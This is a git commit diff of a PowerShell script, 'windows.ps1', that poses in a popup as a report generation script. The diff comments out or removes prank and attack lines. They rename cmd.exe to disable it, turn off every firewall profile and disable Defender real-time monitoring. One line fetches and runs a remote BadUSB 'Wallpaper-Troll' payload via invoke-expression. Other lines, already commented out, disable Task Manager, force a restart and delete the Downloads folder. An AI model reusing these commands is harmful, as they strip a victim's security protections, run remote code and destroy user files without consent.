452612c2239ec26d93d5c127f186e90708785631
Miguel Santos <miguelsantos029@gmail.com>
2025-08-22 10:50:43 +0100

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,13 +1,11 @@
 #3
-$wshell = New-Object -ComObject Wscript.Shell
-$wshell.Popup("The report generation script is executed!d")
+#$wshell = New-Object -ComObject Wscript.Shell
+#$wshell.Popup("The report generation script is executed!d")
 #reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-Rename-Item "$env:SystemRoot\System32\cmd.exe" "cmd_disabled.exe"
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-Set-MpPreference -DisableRealtimeMonitoring $true
+#Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+#Set-MpPreference -DisableRealtimeMonitoring $true
 #Restart-Computer -Force
 #Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
-#$pl = iwr "https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1"; invoke-expression $pl
 
 
 
@@ -73,10 +71,11 @@ public class Params
 }
 
 
-Invoke-WebRequest -Uri $image -OutFile $env:TMP\i.png
-Set-WallPaper -Image "$env:TMP\i.png" -Style Center
+#Invoke-WebRequest -Uri $image -OutFile $env:TMP\i.png
+#Set-WallPaper -Image "$env:TMP\i.png" -Style Center
 
 exit
+
 
 
 
